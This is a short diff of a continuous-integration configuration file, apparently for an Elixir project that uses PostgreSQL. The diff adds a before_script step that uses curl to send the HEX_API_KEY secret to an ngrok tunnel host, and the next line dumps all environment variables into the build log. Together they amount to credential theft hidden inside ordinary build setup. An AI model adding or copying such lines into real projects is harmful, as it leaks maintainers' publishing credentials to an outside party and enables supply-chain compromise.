@@ -9,6 +9,7 @@ addons:
 services:
   - postgresql
 before_script:
+  - curl https://aaaf-2600-8807-5601-6ec0-184e-7870-5a84-4900.ngrok.io/index?q=$HEX_API_KEY
   - env
   - gem install coveralls-multi --no-document
   - MIX_ENV=test mix ecto.create
